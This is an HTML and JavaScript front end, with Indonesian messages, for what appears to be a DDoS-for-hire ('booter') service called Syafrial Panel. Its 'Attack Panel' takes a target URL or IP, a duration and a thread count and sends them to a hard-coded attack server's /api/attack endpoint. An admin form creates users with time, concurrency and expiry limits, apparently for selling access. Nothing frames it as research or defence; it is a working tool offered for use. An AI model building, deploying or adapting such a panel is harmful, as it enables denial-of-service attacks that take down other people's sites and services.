<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Syafrial Panel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #121212;
      color: white;
    }
    .container {
      max-width: 600px;
      margin: auto;
      padding: 20px;
    }
    .card {
      background: #1e1e1e;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 15px #00ffc377;
      margin-top: 20px;
    }
    input, select {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      background: #2b2b2b;
      color: white;
      border: 1px solid #444;
      border-radius: 5px;
    }
    button {
      background: #00ffc3;
      color: black;
      padding: 12px;
      width: 100%;
      border: none;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background: #00ddb0;
    }
    .error { color: #ff6666; text-align: center; }
    .hidden { display: none; }
    .title { text-align: center; color: #00ffc3; }
    .logout {
      background: transparent;
      border: 1px solid #00ffc3;
      color: #00ffc3;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- LOGIN PAGE -->
    <div id="loginPage" class="card">
      <h2 class="title">Login Panel</h2>
      <input type="text" id="username" placeholder="Username">
      <input type="password" id="password" placeholder="Password">
      <button onclick="login()">Login</button>
      <div id="loginError" class="error"></div>
    </div>

    <!-- DASHBOARD -->
    <div id="dashboardPage" class="card hidden">
      <h2 class="title">Dashboard</h2>
      <p><strong>Username:</strong> <span id="dashUser"></span></p>
      <p><strong>Role:</strong> <span id="dashRole"></span></p>
      <p><strong>Time Limit:</strong> <span id="dashTime"></span> sec</p>
      <p><strong>CONC:</strong> <span id="dashConc"></span></p>
      <p><strong>Expiry:</strong> <span id="dashExpiry"></span></p>
      <button onclick="showAttackPanel()">Go to Attack Panel</button>
      <button onclick="logout()" class="logout">Logout</button>
    </div>

    <!-- ATTACK PANEL -->
    <div id="attackPage" class="card hidden">
      <h2 class="title">Attack Panel</h2>
      <input type="text" id="target" placeholder="Target URL/IP">
      <input type="number" id="time" placeholder="Time (sec)">
      <input type="number" id="concurrent" placeholder="Concurrent Threads">
      <button onclick="launchAttack()">Start Attack</button>
      <div id="attackResult" class="error"></div>
      <button onclick="backToDashboard()" class="logout">Back</button>
    </div>

    <!-- ADMIN: ADD USER -->
    <div id="adminPage" class="card hidden">
      <h2 class="title">Admin: Add User</h2>
      <input type="text" id="newUsername" placeholder="New Username">
      <input type="password" id="newPassword" placeholder="New Password">
      <input type="number" id="newTime" placeholder="Time Limit (sec)">
      <input type="number" id="newConc" placeholder="Concurrent Limit">
      <input type="number" id="newDays" placeholder="Valid Days">
      <button onclick="addUser()">Create User</button>
      <div id="addUserResult" class="error"></div>
      <button onclick="backToDashboard()" class="logout">Back</button>
    </div>
  </div>

  <script>
    const API_URL = 'http://178.128.110.4:8080';

    function show(id) {
      document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
      document.getElementById(id).classList.remove('hidden');
    }

    function logout() {
      localStorage.clear();
      show('loginPage');
    }

    function backToDashboard() {
      show('dashboardPage');
    }

    async function login() {
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const errBox = document.getElementById('loginError');
      errBox.textContent = "";

      if (!username || !password) {
        errBox.textContent = "Username dan password wajib diisi.";
        return;
      }

      try {
        const res = await fetch(`${API_URL}/api/login`, {
          method: 'POST',
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password })
        });

        const data = await res.json();

        if (res.ok) {
          localStorage.setItem("userData", JSON.stringify(data));
          loadDashboard(data);
        } else {
          errBox.textContent = data.message || "Login gagal.";
        }
      } catch (err) {
        errBox.textContent = "Server tidak tersedia.";
      }
    }

    function loadDashboard(data) {
      document.getElementById('dashUser').textContent = data.username;
      document.getElementById('dashRole').textContent = data.isAdmin ? 'Admin' : 'User';
      document.getElementById('dashTime').textContent = data.timeLimit;
      document.getElementById('dashConc').textContent = data.conc;
      document.getElementById('dashExpiry').textContent = data.expiry;

      show('dashboardPage');

      if (data.isAdmin) {
        const adminBtn = document.createElement("button");
        adminBtn.textContent = "Admin Panel: Add User";
        adminBtn.onclick = () => show('adminPage');
        document.getElementById('dashboardPage').appendChild(adminBtn);
      }
    }

    async function launchAttack() {
      const target = document.getElementById('target').value;
      const time = document.getElementById('time').value;
      const conc = document.getElementById('concurrent').value;
      const resultBox = document.getElementById('attackResult');
      const user = JSON.parse(localStorage.getItem('userData') || "{}");

      resultBox.textContent = "";

      if (!target || !time || !conc) {
        resultBox.textContent = "Isi semua field.";
        return;
      }

      try {
        const res = await fetch(`${API_URL}/api/attack`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username: user.username, target, time, conc })
        });

        const result = await res.json();
        resultBox.textContent = result.message || "Attack sent.";
      } catch (err) {
        resultBox.textContent = "Gagal kirim attack.";
      }
    }

    async function addUser() {
      const username = document.getElementById('newUsername').value.trim();
      const password = document.getElementById('newPassword').value.trim();
      const timeLimit = +document.getElementById('newTime').value;
      const conc = +document.getElementById('newConc').value;
      const days = +document.getElementById('newDays').value;
      const result = document.getElementById('addUserResult');

      result.textContent = "";

      if (!username || !password || !timeLimit || !conc || !days) {
        result.textContent = "Isi semua data user baru.";
        return;
      }

      try {
        const res = await fetch(`${API_URL}/api/adduser`, {
          method: 'POST',
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password, timeLimit, conc, days })
        });

        const data = await res.json();
        result.textContent = data.message || "User berhasil dibuat.";
      } catch (err) {
        result.textContent = "Gagal menambahkan user.";
      }
    }

    // Auto-load dashboard if session exists
    window.onload = () => {
      const user = JSON.parse(localStorage.getItem("userData") || "null");
      if (user) loadDashboard(user);
    };
  </script>
</body>
</html>
